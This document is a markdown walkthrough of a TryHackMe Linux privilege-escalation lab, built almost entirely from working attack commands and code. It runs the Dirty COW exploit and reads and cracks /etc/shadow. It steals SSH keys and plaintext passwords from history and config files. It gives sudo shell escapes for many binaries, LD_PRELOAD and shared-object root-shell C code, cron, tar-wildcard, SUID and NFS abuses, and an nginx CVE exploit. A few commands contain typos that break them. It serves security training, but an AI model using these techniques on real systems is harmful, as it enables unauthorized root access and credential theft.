# Linux Privilege escalation arena

## Privilege Escalation - Kernel Exploits

First we run Linux exploit suggester as below

```bash
$/home/user/tools/linux-exploit-suggester/linux-exploit-suggester.sh
```

We can see that this kernel is vulnerable to [dirty cow](https://github.com/firefart/dirtycow.git) exploit now we can use this to exploit the system.

```bash
$gcc -pthread /home/user/tools/dirtycow/c0w.c -o c0w
$./c0w
```

It will take some time to build now in command prompt type **passwd** and voila we get the root shell. After expoit if you want to make the system normal you need to copy the backup passwd binary to /usr/bin directory.

```bash
#cp /tmp/bak /usr/bin/passwd
```

## Privilege Escalation - Stored Passwords

There are newmerous places where passwords can be stored as plain text let us explore

```bash
$cat /home/user/myvpn.ovpn #We have a pointer to the config file from where the system reads the password
$cat /etc/openvpn/auth.txt #We have got the password
$cat /home/user/.irssi/config | grep -i passw
```

Sometimes we may get passwords from history files

```bash
$cat ~/.bash_history | grep -i passw
```

## Privilege Escalation - weak file permission

If we run ```ls -la /etc/shadow``` we can see that we have read permission to the shadow file so we can try to break a system user password by unshadowing the passwd file.

```bash
$cat /etc/passwd #Save the file with a suitable name in your atack box
$cat /etc/shadow #Save this one with a different name in your atack box
 # Then run the below command to unshadow it
 $unshadow <passwd file> <shadow file> > unshadowed.txt
 $hashcat -m 1800 unshadowed.txt /usr/share/wordlists/rockyou.txt #passwords are saved as SHA512 in linux that's why we used 1800 as hash mode.
 ```

 And we get the root password.

 ## Privilege Escalation - SSH keys

 We can try to find the id_rsa file in the system if present we can use to login to the system

 ```bash
 $find / -name id_rsa 2>/dev/null
 ```

 We get the location of id_rsa file and now we can save the file with 600 permission and we can log into the system using this private key.

 ```bash
 $chmod 600 id_rsa
 $ssh -i id_rsa root@<ip>
 ```

 ## Privilege Escalation - Sudo (Shell Escaping)

 If we run ```sudo -l``` we can see there are bunch of binaries that has sudo with nopasswd permission for the user (the binaries are iftop, find, nano, vim, man, awk, less, ftp, nmap, more)

 We will try to escape them one by one.

 ### iftop
 
 From [GTFobins](https://gtfobins.github.io/gtfobins/iftop/#sudo) If the binary is allowed to run as superuser by **sudo**, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access. 

```bash
$sudo iftop
$!/bin/sh
```

### find

```bash
$sudo find . -exec /bin/sh \; -quit
# or 
$sudo find . -exec /bin/bash \; -quit
```

### nano

```bash
$sudo nano
^R^X
reset; sh 1>&0 2>&0
```

And we will get a root shell within the nano editor

### vim

```bash
$sudo vim -c ':!/bin/sh' # or
$sudo vim -c ':python3 import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")' #This requires that vim is compiled with python support.
$sudo vim -c ':lua os.execute("reset; exec sh")' #This requires that vim is compiled with lua support
```

### man 

```bash
$sudo man man
!/bin/sh
```

### awk

```bash
$sudo awk 'BEGIN {system("/bin/sh")}'
```

### less

```bash
$sudo less /etc/profile
!/bin/bash
```

### more

```bash
$TERM= sudo more /etc/profile or simply sudo more /etc/profile
!/bin/bash
```

### ftp

```bash
$sudo ftp
!/bin/bash
```

### nmap

First Way input echo is disabled

```bash
$TF=$(mktemp)
$echo 'os.execute("/bin/bash")' >  $TF
$sudo nmap --script=$TF
or
$echo "os.execute('bin/bash')" > shell.nse && sudo nmap --script=shell.nse
```


Second way interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands.

```bash
$sudo nmap --interactive
nmap>!bash
```

## Privilege Escalation - Abusing Intended Functionality

1. In command prompt type:
   ```$sudo apache2 -f /etc/shadow```
2. From the output, copy the root hash and break it using john

```bash
$echo 'root has here' > hash.txt
$john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## Privilege Escalation - LD_PRELOAD

In command prompt type ```sudo -l``` notice that LD_PRELOAD environment variable is intact.

Exploitation

Open a text editior and type

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

Save the file as x.c then execute ```gcc -fPIC -shared -o /tmp/x.so s.c -nostartfiles```. Then ```sudo LD_PRELOAD=/tmp/x.so apache2``` after this we have a root shell to the system.

## Privilege Escalation - Shared Object Injection

In comman prompt type ```find / -type f -perm -04000 -ls 2>/dev/null``` make note of all the suid binaries. In command line type : ```strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"``` From the output, we can see that a .so file is missing from a writable directory.

#### Exploitation

In comand prompt type: ```mkdir /home/user/.config``` then ```cd /home/user/.config``` after that ```vi libcalc.c``` add the code below to the file

```c
#include <stdio.h>
#include <stdlib.h>

static void inject()__attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

Then in command line type ```gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c``` after building the lib file just type ```/usr/local/bin/suid-so```

And we get the root shell.

## Privilege Escalation - SUID (Symlinks)

```dpkg -l | grep nginx``` shows that nginx version is below 1.6.2-5+deb8u3. After searching cve we found that there is a cve exists for below this version (CVE-2016-1247). So, let us try to exploit it. Let's login as www-data with ```su -l www-data``` in root shell then in command prompt type ```/home/user/tools/nginx/nginxed-root.sh /var/log/nginx/error.log``` At this stage, the system waits for logrotate to execute. One logrotate executes we get the root terminal here.

### For testing 
Let us open another therminal and login as root with the given root pass. As root type ```invoke-rc.d nginx rotate >/dev/null 2>&1```

## Privilege Escalation - SUID (Environment Variables \#1)

Find the SUID enabled binary as earlier. Then in terminal type 
```bash
$echo 'int main() {setgid(0); setuid(0); system("/bin/bash"); return 0;}' > /tmp/service.c
$gcc /tmp/service.c -o /tmp/service
$export PATH=/tmp:$PATH
/usr/local/bin/suid-env
```
And we get to the root shell.

## Privilege Escalation - SUID (Environment Variables \#2)

We have found that we have 2 SUID env so now we will use the second one to escalate our privilege.

Exploitation Method \#1

In command prompt type: ```function /usr/sbin/service() {cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p;}``` Now ```export -f /user/sbin/service``` and then ```/usr/local/bin/suid-env2``` and we get to root shell.

Exploitation Method \#2

In command prompt tyhpe: ```env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'``` and root shell is there.

## Privilege Escalation - Using capabilities

```$getcap -r / 2>/dev/null``` will give you the list of binaries that has capabilities enabled. In our case we get **/usr/bin/python2.6**

Exploitation Method

```bash
/usr/bin/python2.6 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/bash")'
```

## Privilage Escalation - Cron (PATH)

From ```cat /etc/crontab```  command we can see that there is a script called overwrite.sh that runs every minute without absolute location which can be used to escalate privilege as follows

```bash
$echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
$chmod +x /home/user/overwrite.sh
```

Wait 1 min for the bash script to execute then type ```/tmp/bash -p``` and you can get the root shell.

## Privilege Escalation - (Wildcards)

We have seen there is another script file let's see the code of that script ```cat /usr/local/bin/compress.sh```. We can see that wildcard (*) is used by tar. 

Exploitation Method

```bash
$echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh
$touch /home/user/--checkpoint=1
$touch /home/user/--checkpoint-action=exec=sh\ runme.sh
```

Wait 1 min for this script to run then type ```/tmp/bash -p```.

## Privilege Escalation - Cron  (File Overwrite)

We have seen that there is a script file called overwrite.sh let's try to find it's location with ```find / -name overwrite.sh 2>/dev/null```. The location is /usr/local/bin/overwrite.sh now let's see if we have permission to write to that file with ```ls -la /usr/local/bin```. We can see that we have permission to write to that file. So, let's overwrite it by using ```echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /usr/local/bin/overwrite.sh``` Now wait for 1 min for the script to run then type ```/tmp/bash -p```

## Privilege Escalation - NFS root Squashing

Find the NFS permission by using ```cat /etc/exports```, now find the exports by using ```showmount -e ip```. Now in attacker machine type 

```bash
$mkdir /tmp/1
#mount -o rw,vers=2 ip:/tmp /tmp/1
#echo 'int main() {setuid(0); setgid(0); system("/bin/bash");}' > /tmp/1/x.c
#gcc /tmp/1/x.c -o /tmp/1/x
#chmod +s /tmp/1/x
```

In target machine run ```/tmp/x```

## Resources
[TryHackMe](https://tryhackme.com)
[LegalHackers](https://legalhackers.com/)
[GTFobins](https://gtfobins.github.io/)
